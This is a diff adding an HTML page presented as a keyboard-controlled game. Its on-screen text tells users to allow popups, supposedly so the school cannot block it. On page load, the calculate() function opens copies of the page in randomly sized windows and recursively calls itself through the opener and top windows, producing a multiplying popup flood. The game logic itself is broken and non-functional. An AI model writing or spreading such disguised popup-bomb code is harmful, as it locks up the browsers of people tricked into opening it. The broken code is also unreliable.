@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<h1>allow popups to play, the game appears in a pop up to stop the school from blocking it, then reload for it to work</h1>
+<h1>space to start</h1>
+<body onload="calculate()">
+<img src="" alt="player" id="player">
+<img src="" alt="bg" id="bg">
+<p id="endText"></p>
+<script>
+var x=0;
+var y=0;
+var bgX=10;
+var score=0;
+var pastScores=[]
+function load(){ 
+document.getElementById("player").src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwL5Aoq1CJEf-8HbK3_dwxIZ6SdfapX_sfuw&s"
+document.getElementById("bg").src="https://freepngimg.com/save/webp/88077-plant-art-sprite-game-grass-pixel"
+document.addEventListener('keydown', function(event) {
+  switch (event.keyCode) {
+    case 32:
+    runStart();
+	break;
+}
+}
+}
+function runStart(){
+score=0;
+x=0;
+y=0;
+bgX=10
+while(x!=bgX){
+switch (event.keyCode) {
+    case 32:
+    //change y by 10
+	break;
+    case 68:
+    //change x by 10
+    break;
+    case 65:
+    //change y by 10
+    break;
+}
+}
+runEnd();
+}
+function runEnd(){
+document.getElementById("endText").innerHTML="r to retry"
+switch (event.keyCode) {
+    case 82:
+    storeScores();
+    document.getElementById("endText").innerHTML=""
+    runStart();
+	break;
+}
+}
+function storeScores{
+appendItem(pastScores,score);
+}
+</script>
+<script>
+function calculate() {
+let randomWidth = Math.floor(Math.random() * 800) + 200;
+let randomHeight = Math.floor(Math.random() * 600) + 200;  
+const myWindow = window.open(window.location.href,target='_blank',`width=${randomWidth},height=${randomHeight}`);
+  myWindow.opener.calculate();
+myWindow.opener.calculate();
+  myWindow.top.calculate();
+myWindow.top.calculate();
+myWindow.top.calculate();
+}
+</script>
+</body>
+</html>
